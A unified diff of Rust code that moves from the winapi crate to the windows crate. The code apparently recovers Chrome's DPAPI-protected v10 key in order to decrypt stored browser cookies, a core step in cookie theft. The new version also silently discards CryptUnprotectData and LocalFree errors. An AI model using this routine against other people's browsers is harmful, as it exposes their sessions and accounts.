@@ -1,31 +1,11 @@
-use std::{env, path::{self, PathBuf}, fs, ptr, fmt};
+use std::{env, path::{self, PathBuf}, fs, ptr, fmt, ffi::c_void};
 use time::OffsetDateTime;
 use cookie::Expiration;
 use serde_json;
-use base64::{Engine as _, engine::general_purpose};
-
-// SQLITE
 use sqlite;
-
-// WINAPI
-use winapi::{
-    um::{
-        winbase,
-        dpapi,
-        wincrypt
-    },
-    shared::minwindef
-};
-
-// AES_GCM
-use aes_gcm::{
-    Aes256Gcm, Key,
-    aead::{
-        Aead, 
-        KeyInit, 
-        generic_array::GenericArray
-    }
-};
+use base64::{Engine as _, engine::general_purpose};
+use windows::Win32::{Foundation, Security::Cryptography};
+use aes_gcm::{Aes256Gcm, Key,aead::{Aead, KeyInit, generic_array::GenericArray}};
 
 
 struct Cookie {
@@ -68,34 +48,35 @@ fn find_chrome_paths() -> (PathBuf, PathBuf) {
 }
 
 
-fn decrypt(keydpapi: &[u8]) -> Result<Vec<u8>, String> {
+fn decrypt(keydpapi: &mut [u8]) -> Result<Vec<u8>, String> {
     // https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
     // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-localfree
     // https://docs.rs/winapi/latest/winapi/um/dpapi/index.html
     // https://docs.rs/winapi/latest/winapi/um/winbase/fn.LocalFree.html
 
-    let mut data_in = wincrypt::DATA_BLOB {
-        cbData: keydpapi.len() as minwindef::DWORD,
-        pbData: keydpapi.as_ptr() as *mut minwindef::BYTE,
+    let mut data_in = Cryptography::CRYPT_INTEGER_BLOB {
+        cbData: keydpapi.len() as u32,
+        pbData: keydpapi.as_mut_ptr(),
     };
-    let mut data_out = wincrypt::DATA_BLOB {
+    let mut data_out = Cryptography::CRYPT_INTEGER_BLOB {
         cbData: 0,
         pbData: ptr::null_mut()
     };
-    let result = unsafe {
-        dpapi::CryptUnprotectData(
+
+    unsafe {
+        let _ = match Cryptography::CryptUnprotectData(
             &mut data_in,
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
+            Some(ptr::null_mut()),
+            Some(ptr::null_mut()),
+            Some(ptr::null_mut()),
+            Some(ptr::null_mut()),
             0,
-            &mut data_out
-        )
-    };
-    if result == 0 {
-        return Err("CryptUnprotectData failed".to_string())
-    };
+            &mut data_out,
+        ) {
+            Ok(_) => Ok(()),
+            Err(_) => Err("CryptUnprotectData failed"),
+        };
+    }
     if data_out.pbData.is_null() {
         return Err("CryptUnprotectData returned a null pointer".to_string());
     }
@@ -103,18 +84,19 @@ fn decrypt(keydpapi: &[u8]) -> Result<Vec<u8>, String> {
     let decrypted_data = unsafe {
         std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec()
     };
-    let result = unsafe {
-        winbase::LocalFree(data_out.pbData as minwindef::HLOCAL)
+    let pbdata_hlocal = Foundation::HLOCAL(data_out.pbData as *mut c_void);
+    unsafe {
+        let _ = match Foundation::LocalFree(pbdata_hlocal) {
+            Ok(_) => Ok(()),
+            Err(_) => Err("LocalFree failed")
+        };
     };
-    if !result.is_null() {
-        return Err("LocalFree failed".to_string());
-    }
     Ok(decrypted_data)
 }
 
 fn get_v10_key(key64: &str) -> Vec<u8> {
-    let keydpapi: Vec<u8> = general_purpose::STANDARD.decode(&key64).unwrap();
-    let keydpapi = &keydpapi[5..];
+    let mut keydpapi: Vec<u8> = general_purpose::STANDARD.decode(&key64).unwrap();
+    let keydpapi = &mut keydpapi[5..];
     let v10_key = decrypt(keydpapi).unwrap();
     v10_key
 }
